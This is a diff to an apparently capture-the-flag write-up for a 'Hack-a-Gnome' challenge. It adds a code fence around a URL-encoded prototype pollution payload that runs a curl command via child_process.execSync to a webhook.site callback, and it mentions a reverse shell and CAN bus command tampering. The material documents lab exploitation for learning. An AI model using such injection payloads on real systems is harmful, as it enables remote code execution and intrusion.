@@ -124,7 +124,9 @@ message=%7B%22action%22%3A%22update%22%2C%22key%22%3A%22__proto__%22%2C%22subkey
 
 Payload that uses webhook.site as a sensor:
 
+```
 message=%7B%22action%22%3A%22update%22%2C%22key%22%3A%22__proto__%22%2C%22subkey%22%3A%22outputFunctionName%22%2C%22value%22%3A%22x%3Bprocess.mainModule.require('child_process').execSync('curl%20https%3A%2F%2Fwebhook.site%2Ff3bc21bc-b85f-4bb1-9bf2-bd4ac5767b96')%3Bs%22%7D
+```
 
 Webhook detects the connection:
 
@@ -149,11 +151,9 @@ message=%7B%22action%22%3A%22update%22%2C%22key%22%3A%22__proto__%22%2C%22subkey
 
 ![Hack-a-Gnome Reverse Shell](/images/hack-a-gnome_reverseshell.jpg) 
 
-Once the payload is sent, trigger a refresh in the application to load (change name + refresh)
+Once the payload is sent, trigger a refresh in the application to load the payload (change name + refresh).
 
-There is lots of canbus data, but nothing really useful. Lets refer back to the README.md
-
-The README.md shows that CAN IDs are grouped by type or purpose. 400 codes are requests, 300 codes are status. It is reasonable to assume that commands are a separate group, either 200 or 500 codes.Lets start with 200, and assume they are sequential. Let’s start with 200-204.  I need to note that while the shell is active, I am unable to get any feedback to commands. I need to change the python file, disconnect, and then test.
+The README.md shows that CAN IDs are grouped by type or purpose. 400 codes are requests, 300 codes are status. It is reasonable to assume that commands are a separate group, either 200 or 500 codes.Lets start with 200, and assume they are sequential. Let’s start with 200-204.  While the shell is active, it is not possible to get any feedback to commands. The process is to connect,  change the python file, disconnect, and then test.
 
 ```sh
 sed -i 's/0x244/0x200/g' canbus_client.py   # up
@@ -184,11 +184,11 @@ With control of the robot, boxes need to be moved so the power switch can be rea
 
 | Tools Used           | Tool Version |
 | :-----------------------: | :--------------------------------: |
-| crackstation.net |  | 
+| crackstation.net | N/A  | 
 | Burpsuite Community Edition |  |
-| Claude.ai |  | 
+| Claude.ai | 4.5 | 
 | Ubuntu Linux Linode  |   |
-| Webhook.net |   |
+| Webhook.net | N/A  |
 
 ## Hints Reference
 | Provided By         | Hint |
